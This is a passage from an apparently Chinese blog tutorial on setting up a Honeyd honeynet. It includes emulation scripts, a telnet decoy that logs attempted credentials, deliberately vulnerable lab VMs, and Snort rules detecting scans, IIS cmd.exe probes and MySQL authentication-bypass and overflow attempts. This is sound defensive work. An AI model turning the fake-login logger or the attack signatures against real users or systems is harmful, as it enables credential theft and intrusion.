"/usr/share/honeyd-1.5c/scripts/router-telnet.pl"</span><br><span class="line">add windows tcp port 21 proxy 192.168.43.1:21</span><br><span class="line"></span><br><span class="line">create linux</span><br><span class="line">set linux personality "Linux 2.4.20"   </span><br><span class="line">set linux default tcp action reset   </span><br><span class="line">set linux default udp action reset   </span><br><span class="line">set linux default icmp action open</span><br><span class="line">add linux tcp port 80 "/usr/share/honeyd-1.5c/scripts/web.sh"</span><br><span class="line">add linux tcp port 23 "/usr/share/honeyd-1.5c/scripts/router-telnet.pl"</span><br><span class="line">add linux tcp port 22 "/usr/share/honeyd-1.5c/scripts/ssh.sh"</span><br><span class="line">add linux tcp port 21 proxy 192.168.43.1:21</span><br><span class="line">add linux tcp port 20 open</span><br><span class="line"></span><br><span class="line">create router   </span><br><span class="line">set router personality "Cisco 7206 running IOS 11.1(24)"   </span><br><span class="line">set router default tcp action reset</span><br><span class="line">add router tcp port 23 "/usr/share/honeyd-1.5c/scripts/router-telnet.pl"  </span><br><span class="line"></span><br><span class="line">bind 192.168.43.153 router   </span><br><span class="line">bind 192.168.43.156 router  </span><br><span class="line"></span><br><span class="line">bind 192.168.43.154 windows   </span><br><span class="line">bind 192.168.43.155 linux   </span><br><span class="line">bind 192.168.43.157 windows   </span><br><span class="line">bind 192.168.43.158 linux</span><br></pre></td></tr></table></figure></li><li><p>各种端口配置文件位于<code>/honeyd/honeyd-1.5c/script</code>位置，包括</p><p><code>ssh.sh</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># $1: srcip, $2: srcport, $3: dstip, $4: dstport, $5: config</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># modified by Fabian Bieker &lt;fabian.bieker@web.de&gt;</span></span><br><span class="line"><span class="comment"># modified by DataSoft Corporation</span></span><br><span class="line"><span class="comment">#. scripts/misc/base.sh</span></span><br><span class="line">SRCIP=<span class="variable">$1</span></span><br><span class="line">SRCPORT=<span class="variable">$2</span></span><br><span class="line">DSTIP=<span class="variable">$3</span></span><br><span class="line">DSTPORT=<span class="variable">$4</span></span><br><span class="line"></span><br><span class="line">STRINGSFILE=<span class="variable">$5</span></span><br><span class="line">VERSION=`perl -nle <span class="string">'/SSH_VERSION (.*)/ and print $1'</span> &lt; <span class="variable">$STRINGSFILE</span>`</span><br><span class="line"></span><br><span class="line">SERVICE=<span class="string">"ssh"</span></span><br><span class="line">HOST=<span class="string">"serv"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">my_start</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"<span class="variable">$VERSION</span>"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> name; <span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$name</span>"</span> &gt;&gt; <span class="variable">$LOG</span></span><br><span class="line">LINE=`<span class="built_in">echo</span> <span class="string">"<span class="variable">$name</span>"</span> | egrep -i <span class="string">"[\n ]"</span>`</span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">"<span class="variable">$LINE</span>"</span> ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Protocol mismatch."</span></span><br><span class="line">my_stop</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"<span class="variable">$name</span>"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">my_stop</span><br></pre></td></tr></table></figure><p><code>web.sh</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">REQUEST=<span class="string">""</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> name</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">LINE=`<span class="built_in">echo</span> <span class="string">"<span class="variable">$name</span>"</span> | egrep -i <span class="string">"[a-z:]"</span>`</span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">"<span class="variable">$LINE</span>"</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$name</span>"</span> &gt;&gt; /tmp/<span class="built_in">log</span></span><br><span class="line">NEWREQUEST=`<span class="built_in">echo</span> <span class="string">"<span class="variable">$name</span>"</span> | grep <span class="string">"GET .scripts.*cmd.exe.*dir.* HTTP/1.0"</span>`</span><br><span class="line"><span class="keyword">if</span> [ ! -z <span class="string">"<span class="variable">$NEWREQUEST</span>"</span> ] ; <span class="keyword">then</span></span><br><span class="line">REQUEST=<span class="variable">$NEWREQUEST</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">"<span class="variable">$REQUEST</span>"</span> ] ; <span class="keyword">then</span></span><br><span class="line">cat &lt;&lt; _eof_</span><br><span class="line">HTTP/1.1 404 NOT FOUND</span><br><span class="line">Server: Microsoft-IIS/5.0</span><br><span class="line">P3P: CP=<span class="string">'ALL IND DSP COR ADM CONo CUR CUSo IVAo IVDo PSA PSD TAI TELo OUR SAMo CNT COM INT NAV ONL PHY PRE PUR UNI'</span></span><br><span class="line">Content-Location: http://cpmsftwbw27/default.htm</span><br><span class="line">Date: Thu, 04 Apr 2002 06:42:18 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;title&gt;You are <span class="keyword">in</span> Error&lt;/title&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;You are <span class="keyword">in</span> Error&lt;/h1&gt;</span><br><span class="line">O strange and inconceivable thing! We did not really die, we were not really buried, we were not really crucified and raised again, but our imitation was but a figure, <span class="keyword">while</span> our salvation is <span class="keyword">in</span> reality. Christ was actually crucified, and actually buried, and truly rose again; and all these things have been vouchsafed to us, that we, by imitation communicating <span class="keyword">in</span> His sufferings, might gain salvation <span class="keyword">in</span> reality. O surpassing loving-kindness! Christ received the nails <span class="keyword">in</span> His undefiled hands and feet, and endured anguish; <span class="keyword">while</span> to me without suffering or toil, by the fellowship of His pain He vouchsafed salvation.</span><br><span class="line">&lt;p&gt;</span><br><span class="line">St. Cyril of Jerusalem, On the Christian Sacraments.</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">_eof_</span><br><span class="line"><span class="built_in">exit</span> 0</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">DATE=`date`</span><br><span class="line">cat &lt;&lt; _eof_</span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Date: <span class="variable">$DATE</span></span><br><span class="line">Server: Microsoft-IIS/5.0</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> Volume <span class="keyword">in</span> drive C is Webserver      </span><br><span class="line"> Volume Serial Number is 3421-07F5</span><br><span class="line"> Directory of C:\inetpub</span><br><span class="line"></span><br><span class="line">01-20-02   3:58a      &lt;DIR&gt;          .</span><br><span class="line">08-21-01   9:12a      &lt;DIR&gt;          ..</span><br><span class="line">08-21-01  11:28a      &lt;DIR&gt;          AdminScripts</span><br><span class="line">08-21-01   6:43p      &lt;DIR&gt;          ftproot</span><br><span class="line">07-09-00  12:04a      &lt;DIR&gt;          iissamples</span><br><span class="line">07-03-00   2:09a      &lt;DIR&gt;          mailroot</span><br><span class="line">07-16-00   3:49p      &lt;DIR&gt;          Scripts</span><br><span class="line">07-09-00   3:10p      &lt;DIR&gt;          webpub</span><br><span class="line">07-16-00   4:43p      &lt;DIR&gt;          wwwroot</span><br><span class="line">             0 file(s)              0 bytes</span><br><span class="line">            20 dir(s)     290,897,920 bytes free</span><br><span class="line">_eof_</span><br></pre></td></tr></table></figure><p><code>router.pl</code></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"><span class="comment"># Copyright 2002 Niels Provos &lt;provos@citi.umich.edu&gt;</span></span><br><span class="line"><span class="comment"># All rights reserved.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># For the license refer to the main source code of Honeyd.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Don't echo Will Echo Will Surpress Go Ahead</span></span><br><span class="line">$return = <span class="keyword">pack</span>(<span class="string">'ccccccccc'</span>, <span class="number">255</span>, <span class="number">254</span>, <span class="number">1</span>, <span class="number">255</span>, <span class="number">251</span>, <span class="number">1</span>, <span class="number">255</span>, <span class="number">251</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">syswrite</span> STDOUT, $return,<span class="number">9</span>;</span><br><span class="line"></span><br><span class="line">$count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> ($count &lt; <span class="number">3</span>) &#123;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    $count++;</span><br><span class="line">    <span class="keyword">syswrite</span> STDOUT, <span class="string">"\r\n"</span>;</span><br><span class="line">    $word = read_word(<span class="string">"Username: "</span>, <span class="number">1</span>);</span><br><span class="line">  &#125; <span class="keyword">while</span> (!$word &amp;&amp; $count &lt; <span class="number">3</span>);</span><br><span class="line">  <span class="keyword">if</span> ($count &gt;= <span class="number">3</span> &amp;&amp; !$word) &#123;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  $password = read_word(<span class="string">"Password: "</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (!$password) &#123;</span><br><span class="line">    <span class="keyword">syswrite</span> STDOUT, <span class="string">"% Login invalid\r\n"</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">syswrite</span> STDERR, <span class="string">"Attempted login: $word/$password"</span>;</span><br><span class="line">    <span class="keyword">syswrite</span> STDOUT, <span class="string">"% Access denied\r\n"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">read_word</span> </span>&#123;</span><br><span class="line">  <span class="keyword">local</span> $prompt = <span class="keyword">shift</span>;</span><br><span class="line">  <span class="keyword">local</span> $echo = <span class="keyword">shift</span>;</span><br><span class="line">  <span class="keyword">local</span> $word;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">syswrite</span> STDOUT, <span class="string">"$prompt"</span>;</span><br><span class="line"></span><br><span class="line">  $word = <span class="string">""</span>;</span><br><span class="line">  $alarmed = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">eval</span> &#123;</span><br><span class="line">    <span class="keyword">local</span> $SIG<span class="string">&#123;ALRM&#125;</span> = <span class="function"><span class="keyword">sub</span> </span>&#123; $alarmed = <span class="number">1</span>; <span class="keyword">die</span>; &#125;;</span><br><span class="line">    <span class="keyword">alarm</span> <span class="number">30</span>;</span><br><span class="line">    $finished = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      $nread = <span class="keyword">sysread</span> STDIN, $buffer, <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">die</span> <span class="keyword">unless</span> $nread;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">ord</span>($buffer) == <span class="number">0</span>) &#123;</span><br><span class="line">; <span class="comment">#ignore</span></span><br><span class="line">      &#125; <span class="keyword">elsif</span> (<span class="keyword">ord</span>($buffer) == <span class="number">255</span>) &#123;</span><br><span class="line"><span class="keyword">sysread</span> STDIN, $buffer, <span class="number">2</span>;</span><br><span class="line">      &#125; <span class="keyword">elsif</span> (<span class="keyword">ord</span>($buffer) == <span class="number">13</span> || <span class="keyword">ord</span>($buffer) == <span class="number">10</span>) &#123;</span><br><span class="line"><span class="keyword">syswrite</span> STDOUT, <span class="string">"\r\n"</span> <span class="keyword">if</span> $echo;</span><br><span class="line">$finished = <span class="number">1</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">syswrite</span> STDOUT, $buffer, <span class="number">1</span> <span class="keyword">if</span> $echo;</span><br><span class="line">$word = $word.$buffer;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (!$finished);</span><br><span class="line">    <span class="keyword">alarm</span> <span class="number">0</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="comment">#syswrite STDOUT, "\r\n" if $alarmed || ! $echo;</span></span><br><span class="line">  <span class="comment">#if ($alarmed) &#123;</span></span><br><span class="line">   <span class="comment"># syswrite STDOUT, "% $prompt timeout expired!\r\n";</span></span><br><span class="line">    <span class="comment">#return (0);</span></span><br><span class="line">  <span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ($word);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="启动Honeyd"><a href="#启动Honeyd" class="headerlink" title="启动Honeyd"></a>启动<code>Honeyd</code></h2><p>命令行输入命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arpd 192.168.43.152/29</span><br><span class="line">honeyd -f honeyd.conf -d -l /var/log/honeyd/honeyd.log -s /var/log/honeyd/service.log --fix-webserver-permissions 192.168.43.152/29</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565764175954.png" alt="1565764175954"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565764181622.png" alt="1565764181622"></p><h2 id="检查honeyd搭建情况"><a href="#检查honeyd搭建情况" class="headerlink" title="检查honeyd搭建情况"></a>检查<code>honeyd</code>搭建情况</h2><ol><li><p><code>telnet</code>连接</p><p>kali使用<code>telnet</code>命令，连接<code>192.168.43.157</code>，观察日志文件和连接结果。</p><p>输入命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.43.157</span><br></pre></td></tr></table></figure><p>检测与IP地址为<code>192.168.43.157</code>的<code>telnet连接</code>是否成功。结果如下图所示，连接成功，但因为不知道用户名和密码，输入三次用户名和密码后直接退出。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565764325222.png" alt="1565764325222"></p><p>日志文件如下，可以查看输入的用户名和密码</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565764345368.png" alt="1565764345368"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565764350258.png" alt="1565764350258"></p></li><li><p><code>ssh</code>连接</p><p>使用<code>ssh命令</code>，连接<code>192.168.43.155</code>观察日志文件和连接结果。</p><p>输入命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh 192.168.43.155</span><br></pre></td></tr></table></figure><p>检测<code>ssh连接</code>是否有效，结果如下，与<code>ssh.sh</code>配置文件符合</p></li><li><p><code>web</code>运行</p><p>在浏览器输入URL:<code>192.168.43.155</code>，检测<code>web</code>是否运行</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565764466896.png" alt="1565764466896"></p><p>在网页中输入用户名和密码后点击登录跳转到网页如下，与<code>web.sh</code>配置文件相符合</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565764498045.png" alt="1565764498045"></p><p>查看<code>honeyd</code>日志文件，成功运行<code>web.sh</code>的脚本</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565764543952.png" alt="1565764543952"></p><p>如下所示，从<code>192.168.43.195</code>的<code>52304</code>端口访问了<code>192.168.43.155</code>的<code>80</code>端口</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565764549209.png" alt="1565764549209"></p></li></ol><h1 id="部署漏洞虚拟机"><a href="#部署漏洞虚拟机" class="headerlink" title="部署漏洞虚拟机"></a>部署漏洞虚拟机</h1><ol><li><code>永恒之蓝</code>漏洞，操作系统为win7家庭版虚拟机，ip地址为<code>192.168.43.59</code></li><li><code>CVE-2012-5613</code>，部署在<code>win xp</code>上的<code>mysql5.5.19</code>版本的权限提升漏洞，ip地址为<code>192.168.43.213</code></li><li><code>metasploitable2</code>虚拟机，一个特别制作的<code>ubuntu</code>操作系统，本身设计作为安全工具测试和演示常见漏洞攻击。默认只开启一个网络适配器并且开启<code>NAT</code>和<code>Host-only</code>，该虚拟机的ip为<code>192.168.43.120</code></li></ol><h1 id="在Honeyd虚拟机中安装配置Snort"><a href="#在Honeyd虚拟机中安装配置Snort" class="headerlink" title="在Honeyd虚拟机中安装配置Snort"></a>在<code>Honeyd</code>虚拟机中安装配置<code>Snort</code></h1><h2 id="Snor简介"><a href="#Snor简介" class="headerlink" title="Snor简介"></a><code>Snor</code>简介</h2><p>​        <code>Snort</code>是1998年用C语言开发的开源的入侵检测系统。直至今天，<code>Snort</code>已发展成为一个具有多平台(<code>Multi-Platform</code>)、实时(<code>Real-Time</code>)流量分析、网络IP数据包(<code>Pocket</code>)记录等特性的强大的网络入侵检测/防御系统(<code>Network Intrusion Detection/Prevention System</code>)，即<code>NIDS/NIPS</code>。<code>Snort</code>符合通用公共许可(<code>GPL——GNU General Pubic License</code>)，在网上可以通过免费下载获得<code>Snort</code>。</p><p>​        由于<code>Snort混杂模式</code>可以抓取网段中的所有数据包，<code>snort</code>部署在同一子网下的<code>win7</code>虚拟机上。</p><h2 id="local-rules配置"><a href="#local-rules配置" class="headerlink" title="local.rules配置"></a><code>local.rules</code>配置</h2><p>对尝试对密网中每个主机的访问写入类似如下告警规则：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert tcp any any -&gt; 192.168.43.153 any (msg:"TCP detected"; sid:1000004; rev:12;)</span><br></pre></td></tr></table></figure><p>检测对所有蜜罐虚拟主机和漏洞虚拟机的访问，并产生告警：<code>TCP detected</code>。</p><p>对<code>Sqlmap</code>, <code>WebInspect</code>, <code>Netsparker</code>, <code>Appscan</code>, <code>Nmap</code>, <code>Awvscan</code>的扫描写入告警规则。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565765754290.png" alt="1565765754290"></p><p>经过反复实验后，又修改了NMAP检测规则：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert icmp any any -&gt; 192.168.43.0/24 any (msg: "NMAP ping sweep Scan"; dsize:0;sid:10000004; rev: 1;)</span><br></pre></td></tr></table></figure><h2 id="mysql-rules配置"><a href="#mysql-rules配置" class="headerlink" title="mysql.rules配置"></a><code>mysql.rules</code>配置</h2><p>对<code>3306</code>的<code>sql攻击</code>写入如下告警规则</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">alert tcp any any -&gt; 192.168.43.128/25 3306 (msg:"MYSQL root login attempt"; flow:to_server,established; content:"|0A 00 00 01 85 04 00 00 80|root|00|"; metadata:service mysql; classtype:protocol-command-decode; sid:1775; rev:3;)</span><br><span class="line">alert tcp any any -&gt; 192.168.43.128/25 3306 (msg:"MYSQL show databases attempt"; flow:to_server,established; content:"|0F 00 00 00 03|show databases"; metadata:service mysql; classtype:protocol-command-decode; sid:1776; rev:3;)</span><br><span class="line">alert tcp any any -&gt; 192.168.43.128/25 3306 (msg:"MYSQL 4.0 root login attempt"; flow:to_server,established; content:"|01|"; depth:1; offset:3; content:"root|00|"; within:5; distance:5; nocase; metadata:service mysql; classtype:protocol-command-decode; sid:3456; rev:4;)</span><br><span class="line">alert tcp any any -&gt; 192.168.43.128/25 3306 (msg:"MYSQL CREATE FUNCTION attempt"; flow:to_server,established; content:"|03|create"; offset:4; nocase; pcre:"/\x03create\s+(aggregate\s+)*function/smi"; metadata:service mysql; reference:bugtraq,12781; reference:cve,2005-0709; classtype:misc-activity; sid:3528; rev:3;)</span><br><span class="line">alert tcp any 3306 -&gt; 192.168.43.128/25 any (msg:"MYSQL server greeting"; flow:from_server,established; content:"|00|"; depth:1; offset:3; flowbits:set,mysql.server_greeting; flowbits:noalert; metadata:policy balanced-ips drop, policy connectivity-ips drop, policy security-ips drop, service mysql; reference:bugtraq,10655; reference:cve,2004-0627; reference:nessus,12639; reference:url,www.nextgenss.com/advisories/mysql-authbypass.txt; classtype:attempted-user; sid:3665; rev:6;)</span><br><span class="line">alert tcp any any -&gt; 192.168.43.128/25 3306 (msg:"MYSQL protocol 41 secure client overflow attempt"; flow:to_server,established; flowbits:isset,mysql.server_greeting; content:"|01|"; depth:1; offset:3; byte_test:1,&amp;,0x80,4; byte_test:1,&amp;,0x02,4; content:"|00 14|"; offset:36; isdataat:74,relative; content:!"|00|"; within:74; metadata:policy balanced-ips drop, policy connectivity-ips drop, policy security-ips drop, service mysql; reference:bugtraq,10655; reference:cve,2004-0627; reference:nessus,12639; reference:url,www.nextgenss.com/advisories/mysql-authbypass.txt; classtype:misc-attack; sid:3669; rev:6;)</span><br><span class="line">alert tcp any any -&gt; 192.168.43.128/25 3306 (msg:"MYSQL client authentication bypass attempt"; flow:to_server,established; flowbits:isset,mysql.server_greeting; content:"|01|"; depth:1; offset:3; byte_test:1,&amp;,0x80,4; byte_test:1,!&amp;,0x02,4; content:"|00 14 00|"; offset:9; metadata:policy balanced-ips drop, policy connectivity-ips drop, policy security-ips drop, service mysql; reference:bugtraq,10655; reference:cve,2004-0627; reference:nessus,12639; reference:url,www.nextgenss.com/advisories/mysql-authbypass.txt; classtype:misc-attack; sid:3668; rev:8;)</span><br><span class="line">alert tcp any any -&gt; 192.168.43.128/25 3306 (msg:"MYSQL client overflow attempt"; flow:to_server,established; flowbits:isset,mysql.server_greeting; content:"|01|"; depth:1; offset:3; byte_test:1,!&amp;,0x80,4; byte_test:1,!&amp;,0x02,4; content:"|00|"; offset:9; isdataat:74,relative; content:!"|00|"; within:74; metadata:policy balanced-ips drop, policy connectivity-ips drop, policy security-ips drop, service mysql; reference:bugtraq,10655; reference:cve,2004-0627; reference:nessus,12639; reference:url,www.nextgenss.com/advisories/mysql-authbypass.txt; classtype:misc-attack; sid:3672; rev:6;)</span><br><span class="line">alert tcp any any -&gt; 192.168.43.128/25 3306 (msg:"MYSQL secure client overflow attempt"; flow:to_server,established; flowbits:isset,mysql.server_greeting; content:"|01|"; depth:1; offset:3; byte_test:1,&amp;,0x80,4; byte_test:1,!&amp;,0x02,4; content:"|00 14|"; offset:9; isdataat:74,relative; content:!"|00|"; within:74; metadata:policy balanced-ips drop, policy connectivity-ips drop, policy security-ips drop, service mysql; reference:bugtraq,10655; reference:cve,2004-0627; reference:nessus,12639; reference:url,www.nextgenss.com/advisories/mysql-authbypass.txt; classtype:misc-attack; sid:3670; rev:6;)</span><br><span class="line">alert tcp any any -&gt; 192.168.43.128/25 3306 (msg:"MYSQL protocol 41 client authentication bypass attempt"; flow:to_server,established; flowbits:isset,mysql.server_greeting; content:"|01|"; depth:1; offset:3; byte_test:1,&amp;,0x80,4; byte_test:1,&amp;,0x02,4; content:"|00 14 00|"; offset:36; metadata:policy connectivity-ips drop, policy security-ips drop, service mysql; reference:bugtraq,10655; reference:cve,2004-0627; reference:nessus,12639; reference:url,www.nextgenss.com/advisories/mysql-authbypass.txt; classtype:misc-attack; sid:3667; rev:6;)</span><br><span class="line">alert tcp any any -&gt; 192.168.43.128/25 3306 (msg:"MYSQL protocol 41 client overflow attempt"; flow:to_server,established; flowbits:isset,mysql.server_greeting; content:"|01|"; depth:1; offset:3; byte_test:1,!&amp;,0x80,4; byte_test:1,&amp;,0x02,4; content:"|00|"; offset:36; isdataat:74,relative; content:!"|00|"; within:74; metadata:policy balanced-ips drop, policy connectivity-ips drop, policy security-ips drop, service mysql; reference:bugtraq,10655; reference:cve,2004-0627; reference:nessus,12639; reference:url,www.nextgenss.com/advisories/mysql-authbypass.txt; classtype:misc-attack; sid:3671; rev:6;)</span><br><span class="line">alert tcp $SQL_SERVERS 3306 -&gt; $EXTERNAL_NET any (msg:"MYSQL server greeting finished"; flow:from_server,established; byte_test:1,&gt;,0,3; flowbits:isset,mysql.server_greeting; flowbits:unset,mysql.server_greeting; flowbits:noalert; metadata:policy balanced-ips drop, policy connectivity-ips drop, policy security-ips drop, service mysql; reference:bugtraq,10655; reference:cve,2004-0627; reference:nessus,12639; reference:url,www.nextgenss.com/advisories/mysql-authbypass.txt; classtype:attempted-user; sid:3666; rev:8;)</span><br><span class="line">alert tcp $EXTERNAL_NET any -&gt; $SQL_SERVERS 3306 (msg:"MYSQL CREATE FUNCTION buffer overflow attempt"; flow:to_server,established; content:"|03|create"; offset:4; nocase; pcre:"/\x03create\s+(aggregate\s+)*function\s+\S&#123;50&#125;/smi"; metadata:service mysql; reference:bugtraq,14509; reference:cve,2005-2558; classtype:misc-activity; sid:4649; rev:2;)</span><br><span class="line">alert tcp $EXTERNAL_NET any -&gt; $SQL_SERVERS 3306 (msg:"MYSQL Date_Format denial of service attempt"; flow:to_server,established; content:"DATE_FORMAT"; 